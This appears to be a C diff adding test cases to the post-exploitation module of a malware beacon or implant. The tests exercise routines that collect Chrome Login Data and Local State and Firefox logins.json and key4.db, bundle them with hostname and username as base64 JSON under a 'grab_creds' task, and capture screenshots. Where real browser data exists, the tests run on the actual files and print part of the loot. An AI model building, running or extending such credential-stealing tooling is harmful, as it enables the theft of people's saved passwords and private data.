@@ -358,3 +358,404 @@ BOOL postex_run(LPCSTR taskName) {
     printf("[!] postex_run: Unknown task '%s'\n", taskName);
     return FALSE;
 }
+
+// ============================================================
+// BEACON_TEST — postex test cases
+// ============================================================
+#ifdef BEACON_TEST
+
+// Helper: create a temporary directory + file for simulating browser data
+static BOOL test_create_fake_file(LPCSTR path, const BYTE* data, DWORD size) {
+    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    DWORD written = 0;
+    WriteFile(hFile, data, size, &written, NULL);
+    CloseHandle(hFile);
+    return (written == size);
+}
+
+static BOOL test_ensure_directory(LPCSTR path) {
+    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) return TRUE;
+    return CreateDirectoryA(path, NULL);
+}
+
+// ── Chrome: files present → success ─────────────────────────────────
+BOOL test_postex_chrome_present(void) {
+    printf("\n  --- test_postex_chrome_present ---\n");
+
+    // Build paths where Chrome grab looks for data
+    CHAR loginData[MAX_PATH] = {0};
+    CHAR localState[MAX_PATH] = {0};
+    CHAR chromeDir[MAX_PATH] = {0};
+    CHAR defaultDir[MAX_PATH] = {0};
+
+    ExpandEnvironmentStringsA(
+        "%LOCALAPPDATA%\\Google\\Chrome\\User Data",
+        chromeDir, MAX_PATH);
+    wsprintfA(defaultDir, "%s\\Default", chromeDir);
+    wsprintfA(loginData, "%s\\Login Data", defaultDir);
+    ExpandEnvironmentStringsA(
+        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
+        localState, MAX_PATH);
+
+    // Check if real Chrome data exists (don't create fakes if it does)
+    BOOL realDataExists = (GetFileAttributesA(loginData) != INVALID_FILE_ATTRIBUTES);
+    BOOL createdFakes = FALSE;
+
+    if (!realDataExists) {
+        printf("  [*] No real Chrome data — creating fake test files\n");
+        test_ensure_directory(chromeDir);
+        test_ensure_directory(defaultDir);
+
+        // Fake SQLite header + dummy data simulating Login Data
+        const BYTE fakeLoginDb[] = "SQLite format 3\x00"
+            "fake_login_data_for_test_url=https://example.com"
+            "_user=testuser_pass=encryptedblob123";
+        test_create_fake_file(loginData, fakeLoginDb, sizeof(fakeLoginDb) - 1);
+
+        // Fake Local State JSON (Chrome v80+ AES key structure)
+        const CHAR fakeLocalState[] =
+            "{\"os_crypt\":{\"encrypted_key\":\"RFBBUEK0ZXN0a2V5MTIzNDU2Nzg=\"}}";
+        test_create_fake_file(localState,
+                              (const BYTE*)fakeLocalState,
+                              (DWORD)strlen(fakeLocalState));
+        createdFakes = TRUE;
+    } else {
+        printf("  [*] Real Chrome data found — testing with actual files\n");
+    }
+
+    // Run the grab
+    LOOT_BUNDLE bundle = {0};
+    DWORD hnLen = sizeof(bundle.hostname);
+    DWORD unLen = sizeof(bundle.username);
+    GetComputerNameA(bundle.hostname, &hnLen);
+    GetUserNameA(bundle.username, &unLen);
+
+    BOOL result = postex_grab_chrome(&bundle);
+    printf("  [*] postex_grab_chrome returned: %s\n", result ? "TRUE" : "FALSE");
+    printf("  [*] Files collected: %lu\n", bundle.fileCount);
+
+    if (result && bundle.fileCount > 0) {
+        // Serialize and print JSON to terminal
+        PBYTE packed = NULL;
+        DWORD packedLen = 0;
+        if (postex_serialize_bundle(&bundle, &packed, &packedLen)) {
+            printf("  [+] Chrome JSON (%lu bytes):\n", packedLen);
+            // Print first 500 chars to avoid flooding terminal
+            DWORD printLen = (packedLen > 500) ? 500 : packedLen;
+            printf("  %.*s", printLen, (CHAR*)packed);
+            if (packedLen > 500) printf("... [truncated]");
+            printf("\n");
+            HeapFree(GetProcessHeap(), 0, packed);
+        }
+    }
+
+    // Cleanup bundle memory
+    for (DWORD i = 0; i < bundle.fileCount; i++) {
+        if (bundle.files[i].data)
+            HeapFree(GetProcessHeap(), 0, bundle.files[i].data);
+    }
+
+    // Clean up fake files
+    if (createdFakes) {
+        DeleteFileA(loginData);
+        DeleteFileA(localState);
+        printf("  [*] Cleaned up fake test files\n");
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── Chrome: files missing → graceful failure ────────────────────────
+BOOL test_postex_chrome_missing(void) {
+    printf("\n  --- test_postex_chrome_missing ---\n");
+
+    // Check if real Chrome data exists — if so, skip this test
+    CHAR loginData[MAX_PATH] = {0};
+    ExpandEnvironmentStringsA(
+        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
+        loginData, MAX_PATH);
+
+    if (GetFileAttributesA(loginData) != INVALID_FILE_ATTRIBUTES) {
+        printf("  [*] SKIPPED — real Chrome data exists on this system\n");
+        printf("  [*] Cannot test 'missing' path without removing real data\n");
+        return TRUE;
+    }
+
+    LOOT_BUNDLE bundle = {0};
+    DWORD hnLen = sizeof(bundle.hostname);
+    DWORD unLen = sizeof(bundle.username);
+    GetComputerNameA(bundle.hostname, &hnLen);
+    GetUserNameA(bundle.username, &unLen);
+
+    BOOL result = postex_grab_chrome(&bundle);
+    printf("  [*] postex_grab_chrome returned: %s (expected FALSE)\n",
+           result ? "TRUE" : "FALSE");
+    printf("  [*] Files collected: %lu (expected 0)\n", bundle.fileCount);
+
+    BOOL pass = (!result && bundle.fileCount == 0);
+    printf("  --- RESULT: %s ---\n", pass ? "PASS" : "FAIL");
+    return pass;
+}
+
+// ── Firefox: profiles present → success ─────────────────────────────
+BOOL test_postex_firefox_present(void) {
+    printf("\n  --- test_postex_firefox_present ---\n");
+
+    CHAR profilesDir[MAX_PATH] = {0};
+    CHAR testProfile[MAX_PATH] = {0};
+    CHAR loginsPath[MAX_PATH] = {0};
+    CHAR key4Path[MAX_PATH] = {0};
+
+    ExpandEnvironmentStringsA(
+        "%APPDATA%\\Mozilla\\Firefox\\Profiles",
+        profilesDir, MAX_PATH);
+
+    // Check for real Firefox data
+    BOOL realDataExists = (GetFileAttributesA(profilesDir) != INVALID_FILE_ATTRIBUTES);
+    BOOL createdFakes = FALSE;
+
+    // Check if real profiles have logins.json
+    BOOL hasRealLogins = FALSE;
+    if (realDataExists) {
+        CHAR searchPath[MAX_PATH];
+        wsprintfA(searchPath, "%s\\*", profilesDir);
+        WIN32_FIND_DATAA fd = {0};
+        HANDLE hFind = FindFirstFileA(searchPath, &fd);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+                if (fd.cFileName[0] == '.') continue;
+                CHAR check[MAX_PATH];
+                wsprintfA(check, "%s\\%s\\logins.json", profilesDir, fd.cFileName);
+                if (GetFileAttributesA(check) != INVALID_FILE_ATTRIBUTES) {
+                    hasRealLogins = TRUE;
+                    break;
+                }
+            } while (FindNextFileA(hFind, &fd));
+            FindClose(hFind);
+        }
+    }
+
+    if (!hasRealLogins) {
+        printf("  [*] No real Firefox logins — creating fake test profile\n");
+
+        // Create the directory tree
+        CHAR mozDir[MAX_PATH] = {0};
+        CHAR ffDir[MAX_PATH] = {0};
+        ExpandEnvironmentStringsA("%APPDATA%\\Mozilla", mozDir, MAX_PATH);
+        ExpandEnvironmentStringsA("%APPDATA%\\Mozilla\\Firefox", ffDir, MAX_PATH);
+        test_ensure_directory(mozDir);
+        test_ensure_directory(ffDir);
+        test_ensure_directory(profilesDir);
+
+        wsprintfA(testProfile, "%s\\test1234.default-release", profilesDir);
+        test_ensure_directory(testProfile);
+
+        wsprintfA(loginsPath, "%s\\logins.json", testProfile);
+        wsprintfA(key4Path,   "%s\\key4.db",     testProfile);
+
+        // Fake Firefox logins.json
+        const CHAR fakeLogins[] =
+            "{\"nextId\":2,\"logins\":["
+            "{\"id\":1,\"hostname\":\"https://example.com\","
+            "\"httpRealm\":null,"
+            "\"formSubmitURL\":\"https://example.com/login\","
+            "\"usernameField\":\"user\",\"passwordField\":\"pass\","
+            "\"encryptedUsername\":\"MDIxO...fake_nss_encrypted\","
+            "\"encryptedPassword\":\"MDIxO...fake_nss_encrypted\","
+            "\"timeCreated\":1700000000000}]}";
+        test_create_fake_file(loginsPath,
+                              (const BYTE*)fakeLogins,
+                              (DWORD)strlen(fakeLogins));
+
+        // Fake key4.db (NSS cert DB header + garbage)
+        const BYTE fakeKey4[] = {
+            0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
+            0x4E, 0x53, 0x53, 0x20, 0x6B, 0x65, 0x79, 0x34,
+            0x2E, 0x64, 0x62, 0x20, 0x74, 0x65, 0x73, 0x74
+        };
+        test_create_fake_file(key4Path, fakeKey4, sizeof(fakeKey4));
+        createdFakes = TRUE;
+    } else {
+        printf("  [*] Real Firefox logins found — testing with actual files\n");
+    }
+
+    // Run the grab
+    LOOT_BUNDLE bundle = {0};
+    DWORD hnLen = sizeof(bundle.hostname);
+    DWORD unLen = sizeof(bundle.username);
+    GetComputerNameA(bundle.hostname, &hnLen);
+    GetUserNameA(bundle.username, &unLen);
+
+    BOOL result = postex_grab_firefox(&bundle);
+    printf("  [*] postex_grab_firefox returned: %s\n", result ? "TRUE" : "FALSE");
+    printf("  [*] Files collected: %lu\n", bundle.fileCount);
+
+    if (result && bundle.fileCount > 0) {
+        // Serialize and print JSON to terminal
+        PBYTE packed = NULL;
+        DWORD packedLen = 0;
+        if (postex_serialize_bundle(&bundle, &packed, &packedLen)) {
+            printf("  [+] Firefox JSON (%lu bytes):\n", packedLen);
+            DWORD printLen = (packedLen > 500) ? 500 : packedLen;
+            printf("  %.*s", printLen, (CHAR*)packed);
+            if (packedLen > 500) printf("... [truncated]");
+            printf("\n");
+            HeapFree(GetProcessHeap(), 0, packed);
+        }
+    }
+
+    // Cleanup bundle memory
+    for (DWORD i = 0; i < bundle.fileCount; i++) {
+        if (bundle.files[i].data)
+            HeapFree(GetProcessHeap(), 0, bundle.files[i].data);
+    }
+
+    // Clean up fake files
+    if (createdFakes) {
+        DeleteFileA(loginsPath);
+        DeleteFileA(key4Path);
+        RemoveDirectoryA(testProfile);
+        printf("  [*] Cleaned up fake test files\n");
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── Firefox: profiles missing → graceful failure ────────────────────
+BOOL test_postex_firefox_missing(void) {
+    printf("\n  --- test_postex_firefox_missing ---\n");
+
+    CHAR profilesDir[MAX_PATH] = {0};
+    ExpandEnvironmentStringsA(
+        "%APPDATA%\\Mozilla\\Firefox\\Profiles",
+        profilesDir, MAX_PATH);
+
+    if (GetFileAttributesA(profilesDir) != INVALID_FILE_ATTRIBUTES) {
+        // Profiles dir exists — check if any profile has logins.json
+        CHAR searchPath[MAX_PATH];
+        wsprintfA(searchPath, "%s\\*", profilesDir);
+        WIN32_FIND_DATAA fd = {0};
+        HANDLE hFind = FindFirstFileA(searchPath, &fd);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+                if (fd.cFileName[0] == '.') continue;
+                CHAR check[MAX_PATH];
+                wsprintfA(check, "%s\\%s\\logins.json", profilesDir, fd.cFileName);
+                if (GetFileAttributesA(check) != INVALID_FILE_ATTRIBUTES) {
+                    printf("  [*] SKIPPED — real Firefox data exists\n");
+                    FindClose(hFind);
+                    return TRUE;
+                }
+            } while (FindNextFileA(hFind, &fd));
+            FindClose(hFind);
+        }
+    }
+
+    LOOT_BUNDLE bundle = {0};
+    DWORD hnLen = sizeof(bundle.hostname);
+    DWORD unLen = sizeof(bundle.username);
+    GetComputerNameA(bundle.hostname, &hnLen);
+    GetUserNameA(bundle.username, &unLen);
+
+    BOOL result = postex_grab_firefox(&bundle);
+    printf("  [*] postex_grab_firefox returned: %s (expected FALSE)\n",
+           result ? "TRUE" : "FALSE");
+    printf("  [*] Files collected: %lu (expected 0)\n", bundle.fileCount);
+
+    BOOL pass = (!result && bundle.fileCount == 0);
+    printf("  --- RESULT: %s ---\n", pass ? "PASS" : "FAIL");
+    return pass;
+}
+
+// ── Bundle serialization with mock data ─────────────────────────────
+BOOL test_postex_serialize_bundle(void) {
+    printf("\n  --- test_postex_serialize_bundle ---\n");
+
+    LOOT_BUNDLE bundle = {0};
+    lstrcpynA(bundle.hostname, "TEST-HOST", sizeof(bundle.hostname));
+    lstrcpynA(bundle.username, "test_user", sizeof(bundle.username));
+
+    // Create two mock files in the bundle
+    const CHAR mockFile1[] = "SQLite format 3\x00""fake_chrome_login_data";
+    const CHAR mockFile2[] = "{\"logins\":[{\"hostname\":\"https://test.com\"}]}";
+
+    bundle.files[0].data = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sizeof(mockFile1));
+    memcpy(bundle.files[0].data, mockFile1, sizeof(mockFile1));
+    bundle.files[0].size = sizeof(mockFile1);
+    lstrcpynA(bundle.files[0].path, "C:\\fake\\Login Data", MAX_PATH);
+
+    bundle.files[1].data = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sizeof(mockFile2));
+    memcpy(bundle.files[1].data, mockFile2, sizeof(mockFile2));
+    bundle.files[1].size = (DWORD)strlen(mockFile2);
+    lstrcpynA(bundle.files[1].path, "C:\\fake\\logins.json", MAX_PATH);
+
+    bundle.fileCount = 2;
+
+    // Serialize
+    PBYTE packed = NULL;
+    DWORD packedLen = 0;
+    BOOL result = postex_serialize_bundle(&bundle, &packed, &packedLen);
+
+    printf("  [*] postex_serialize_bundle returned: %s\n",
+           result ? "TRUE" : "FALSE");
+
+    if (result && packed) {
+        printf("  [+] Serialized JSON (%lu bytes):\n", packedLen);
+        printf("  %.*s\n", packedLen, (CHAR*)packed);
+
+        // Validate JSON contains expected fields
+        BOOL hasTask     = (strstr((CHAR*)packed, "\"task\":\"grab_creds\"") != NULL);
+        BOOL hasHostname = (strstr((CHAR*)packed, "\"hostname\":\"TEST-HOST\"") != NULL);
+        BOOL hasUsername = (strstr((CHAR*)packed, "\"username\":\"test_user\"") != NULL);
+        BOOL hasFiles    = (strstr((CHAR*)packed, "\"files\":[") != NULL);
+        BOOL hasB64      = (strstr((CHAR*)packed, "\"data_b64\":\"") != NULL);
+
+        printf("  [*] JSON field checks:\n");
+        printf("    task field:     %s\n", hasTask     ? "FOUND" : "MISSING");
+        printf("    hostname field: %s\n", hasHostname ? "FOUND" : "MISSING");
+        printf("    username field: %s\n", hasUsername ? "FOUND" : "MISSING");
+        printf("    files array:    %s\n", hasFiles    ? "FOUND" : "MISSING");
+        printf("    base64 data:    %s\n", hasB64      ? "FOUND" : "MISSING");
+
+        result = hasTask && hasHostname && hasUsername && hasFiles && hasB64;
+        HeapFree(GetProcessHeap(), 0, packed);
+    }
+
+    // Cleanup
+    HeapFree(GetProcessHeap(), 0, bundle.files[0].data);
+    HeapFree(GetProcessHeap(), 0, bundle.files[1].data);
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+// ── Screenshot test ─────────────────────────────────────────────────
+BOOL test_postex_screenshot(void) {
+    printf("\n  --- test_postex_screenshot ---\n");
+
+    PBYTE data = NULL;
+    DWORD size = 0;
+    BOOL result = postex_screenshot(&data, &size);
+
+    printf("  [*] postex_screenshot returned: %s\n", result ? "TRUE" : "FALSE");
+    if (result && data) {
+        printf("  [*] BMP size: %lu bytes\n", size);
+        // Validate BMP header
+        BOOL validBmp = (size >= sizeof(BITMAPFILEHEADER) &&
+                         ((BITMAPFILEHEADER*)data)->bfType == 0x4D42);
+        printf("  [*] Valid BMP header: %s\n", validBmp ? "YES" : "NO");
+        HeapFree(GetProcessHeap(), 0, data);
+        result = validBmp;
+    }
+
+    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
+    return result;
+}
+
+#endif /* BEACON_TEST */
